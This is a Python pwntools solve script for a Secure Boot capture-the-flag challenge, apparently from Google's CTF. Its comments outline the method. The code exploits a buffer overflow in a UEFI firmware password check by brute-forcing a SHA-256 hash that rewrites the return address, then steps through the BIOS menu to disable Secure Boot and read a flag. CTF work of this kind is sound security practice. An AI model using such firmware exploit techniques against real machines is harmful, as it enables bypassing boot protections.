#!/usr/bin/python2

# Copyright 2019 Google LLC
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
#     https://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# ===== Secure Boot Writeup =====
#
# - First extract content from OVFM.fd e.g., using uefi-firmware-parser.
# - Search for interesting uefi modules. The one that contains the entrypoint
#   for the BIOS interface is in
#   file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section3/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-462caa21-7614-4503-836e-8ab6f4662331/section0.pe
# - Reverse it and find the function that verifies password and has a bof vulnerability.
# - Use the bof to overwrite the pointer to the hash.
# - Calculate a hash with two bytes of the desired return address.
# - Disable Secure Boot and restart the machine.

import hashlib
import string
from pwn import *
from sys import argv

# 0x7ec18b8 is the pointer to return address on the stack, 32 is the size of
# sha256 and + 2 because we want to replace the last two bytes of return address.
stack = 0x7ec18b8 - 32 + 2

# We want 0x067d4d49, and 0x067d is already there so we only ovewrite the
# last two bytes.
bypass_last_bytes = p16(0x4d49)

def brute():
  # Some brute until we find a hash ending with the desired bytes.
  for c1 in string.printable:
    for c2 in string.printable:
      for c3 in string.printable:
        payload = c1 + c2 + c3 + "A"*125 + p64(0) + p32(stack)
        if hashlib.sha256(payload).digest().endswith(bypass_last_bytes):
          print("Found hash!")
          return c1 + c2 + c3 

def solve(conn_type, address="localhost", port=1337):
 
  if conn_type == 'r':
    p = remote(address, port)
  else:
    p = process("./run.py")

  sleep(1)
  p.send("\x1b") # ESC
  sleep(1)
  p.send("\x1b") # ESC
  sleep(1)
  p.send("\x1b") # ESC

  res = p.recvuntil("Password?") 
  p.send("\x0d")
  res = p.recvuntil("Password?") 
  p.send("\x0d")
  res = p.recvuntil("Password?")
 
  p.send(brute() + "A"*133 + p32(stack) + "\x0d")
  
  # At this point we should be in the BIOS
  p.send("\x1b\x5b\x42") # KEY DOWN
  p.send("\x0d") # ENTER
  p.send("\x0d") # ENTER
  p.send("\x1b\x5b\x42") # KEY DOWN
  p.send("\x0d") # ENTER
  p.send("\x0d") # ENTER
  p.send("\x1b") # ESC
  p.send("\x1b") # ESC
  p.send("\x1b\x5b\x42") # KEY DOWN
  p.send("\x1b\x5b\x42") # KEY DOWN
  p.send("\x1b\x5b\x42") # KEY DOWN
  p.send("\x1b\x5b\x42") # KEY DOWN
  p.send("\x0d") # ENTER
  
  sleep(1)
  
  p.recvuntil("$")
  p.sendline("cat flag.txt")
  flag = p.recvuntil("$ ")
  p.close()

  print(flag)

def main():
  if len(argv) < 2:
    print('Usage: %s l|r <address> <port>' % argv[0])
    return

  if len(argv) == 4:
    solve(argv[1], argv[2], argv[3])
  else:
    solve(argv[1])

if __name__ == '__main__':
  main()

